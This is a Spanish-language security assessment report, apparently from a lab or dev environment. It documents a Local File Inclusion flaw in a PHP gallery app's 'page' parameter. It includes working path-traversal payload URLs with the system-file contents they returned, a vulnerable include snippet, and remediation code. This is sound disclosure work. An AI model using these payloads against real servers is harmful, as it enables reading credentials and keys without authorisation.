# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:22:20  
**Objetivo:** http://web.dev.local:8081  
**Tipo de vulnerabilidad:** Local File Inclusion (LFI)

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor mediante la manipulación del parámetro `page` en el script `gallery.php`.

**Severidad:** 🔴 **CRÍTICA**

---

## 2. Descripción de la Vulnerabilidad

### Endpoint afectado
```
http://web.dev.local:8081/gallery.php?page=<valor>
```

### Parámetro vulnerable
- **Nombre:** `page`
- **Método:** GET

### Descripción técnica
La aplicación incluye dinámicamente archivos del sistema de ficheros basándose en el valor del parámetro `page` sin aplicar ningún tipo de sanitización o validación. Esto permite a un atacante utilizar secuencias de traversal de directorios (`../`) para escapar del directorio web raíz y acceder a archivos arbitrarios del sistema operativo.

---

## 3. Pruebas de Explotación

### 3.1 Lectura de `/etc/passwd`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado exitoso — contenido leído:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.2 Lectura de `/etc/hosts`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
fe00::      ip6-localnet
ff00::      ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
172.19.0.2  d5054e367753
```

### 3.3 Lectura de `/proc/version`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../proc/version
```

**Resultado:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

---

## 4. Impacto

| Aspecto | Descripción |
|---------|-------------|
| **Confidencialidad** | Alta — Lectura de archivos sensibles del sistema (credenciales, configuraciones, claves SSH) |
| **Integridad** | Media — Puede derivar en RCE mediante log poisoning |
| **Disponibilidad** | Baja — No impacta directamente la disponibilidad |

### Archivos potencialmente comprometibles
- `/etc/passwd`, `/etc/shadow` — usuarios del sistema
- `/etc/ssh/sshd_config` — configuración SSH
- Archivos de configuración de la aplicación con credenciales de base de datos
- Logs del servidor web para posible escalada a RCE (log poisoning)
- Claves privadas SSL/SSH

---

## 5. Causa Raíz

El código PHP en `gallery.php` realiza una inclusión de archivo sin validar el input del usuario. El patrón vulnerable típico es:

```php
<?php
$page = $_GET['page'];
include($page . '.php');  // o sin extensión
?>
```

No se aplican:
- Validación de lista blanca (whitelist) de valores permitidos
- Sanitización de caracteres `../`
- Restricción con `realpath()` o `basename()`
- Configuración `open_basedir` en PHP

---

## 6. Recomendaciones

1. **Lista blanca de páginas permitidas:** Validar que `page` sea uno de los valores permitidos (`modern`, `classic`, `abstract`, `about`).

```php
$allowed = ['modern', 'classic', 'abstract', 'about'];
if (!in_array($_GET['page'], $allowed)) {
    die('Página no permitida');
}
include($_GET['page'] . '.php');
```

2. **Configurar `open_basedir`** en `php.ini` para restringir el acceso al directorio web.

3. **Deshabilitar `allow_url_include`** en `php.ini`.

4. **Aplicar `realpath()` y verificar prefijo** del directorio base permitido.

5. **Principio de mínimo privilegio:** El proceso web no debe ejecutarse como root.

---

## 7. Clasificación

| Campo | Valor |
|-------|-------|
| **CWE** | CWE-22: Path Traversal / CWE-98: PHP File Inclusion |
| **OWASP** | A01:2021 – Broken Access Control |
| **CVSS v3 (estimado)** | 7.5 (High) |

---

## 8. Conclusión

La aplicación web presenta una vulnerabilidad crítica de Local File Inclusion que permite la lectura de cualquier archivo accesible por el proceso del servidor web. La explotación fue inmediata sin necesidad de autenticación ni herramientas especializadas. Se recomienda la corrección inmediata mediante validación estricta del parámetro `page`.
